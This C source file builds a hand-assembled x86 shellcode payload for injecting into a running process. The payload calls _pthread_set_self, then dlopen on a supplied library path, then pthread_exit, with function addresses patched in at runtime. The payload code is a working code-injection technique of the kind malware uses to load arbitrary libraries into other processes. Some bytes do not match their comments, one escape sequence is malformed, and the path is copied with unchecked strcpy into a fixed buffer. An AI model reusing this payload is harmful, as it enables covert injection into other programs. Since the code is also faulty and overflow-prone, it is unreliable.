#include "payload.h"
#include "common.h"
#include <dlfcn.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

const char inj_code[] = 
    "\x90"             // nop
    // setup stack frame
    "\x55"             // push ebp
    "\x90\xE5"        // movl ebp, esp
    // allocate 16 bytes on the stack
	"\x83\xEC\x10"   // subl	$10, %esp

    // pthread_set_self()
    // ----------------
    // movl eax, (address of pthread_set_self)
    "\xB8" "SELF" 
    // call eax
    "\xFF\0xD0" 

    // dlopen(path, 0);
    // ----------------
    // address of path string buffer 
	// leal	40(eip), eax
    "\x3E\x8D\x40" 
    "\x27" // path buffer offset relative to instruction pointer
	// movl	eax, 0(esp)
    "\x36\x89\x04\x24"
	// movl	$0, 4(esp)
    "\x36\x66\xC7\x44\x24\x04\x00\x00"
    // movl eax, (address of dlopen)
    "\xB8" "OPEN" 
    // call eax
    "\xFF\xD0" 

    // pthread_exit(NULL);
    // ----------------
	// movl	$0, (%esp) # pass NULL
    "\x36\x66\xC7\x04\x24\x00\x00"
    // movl eax, (address of pthread_exit)
    "\xB8" "EXIT" 
    // call eax
    "\xFF\xD0" 

    "\x90" // nop
;

// local macros
#define INJ_SIZE sizeof(inj_code)
#define PATH_SIZE 128

// expose macros
size_t payload_size() { return INJ_SIZE + PATH_SIZE; }
size_t payload_code_size() { return INJ_SIZE; }
size_t payload_path_size() { return PATH_SIZE; }

payload_t* prepare_payload(char* path) {
    void* code = malloc(INJ_SIZE + PATH_SIZE);
    memcpy(code, inj_code, INJ_SIZE);
    memset(code + INJ_SIZE, 0, PATH_SIZE);
    
    printf("pre size: %d\n", find_pattern("\x3E\x8D\x40", 3, code, INJ_SIZE));
    printf("code start: %lu\n", INJ_SIZE);

    void* addr_pthread_set_self = dlsym(RTLD_DEFAULT, "_pthread_set_self"); 
    void* addr_pthread_exit = dlsym(RTLD_DEFAULT, "pthread_exit"); 
    void* addr_dlopen = dlopen;

    if (code_patch(code, sizeof(inj_code), "SELF", addr_pthread_set_self, 4) != 0) {
        panic("failed to patch pthread_set_self\n");
    }
    if (code_patch(code, sizeof(inj_code), "EXIT", addr_pthread_exit, 4) != 0) {
        panic("failed to patch pthread_exit\n");
    }
    if (code_patch(code, sizeof(inj_code), "OPEN", addr_dlopen, 4) != 0) {
        panic("failed to patch dlopen\n");
    }

    payload_t* payload = malloc(sizeof(payload_t));
    payload->code = code;
    payload->path = (void*)(code + INJ_SIZE);

    // write path
    strcpy(payload->path, path);

    return payload;
}

void destroy_payload(payload_t* payload) {
    free(payload->code);
    free(payload);
}

/** searches for a pattern in the code and replaces it with a given string */
int code_patch(
    void* code, 
    size_t code_len, 
    char* pattern, 
    char* patch, 
    size_t patch_len) 
{
    for(size_t i = 0; i < code_len - patch_len; i++) {
        void* ptr = (void*)(code + i);
        if (memcmp(pattern, ptr, patch_len) == 0) {
            memcpy(ptr, patch, patch_len);
            return 0;
        }
    }
    return 1;
}

int find_pattern(char* pattern, int length, void* start, int scan) {
    for(int i = 0; i < scan; i++) {
        void* ptr = (void*)(start + i);
        if (memcmp(pattern, ptr, length) == 0)
            return i;
    }
    return -1;
}

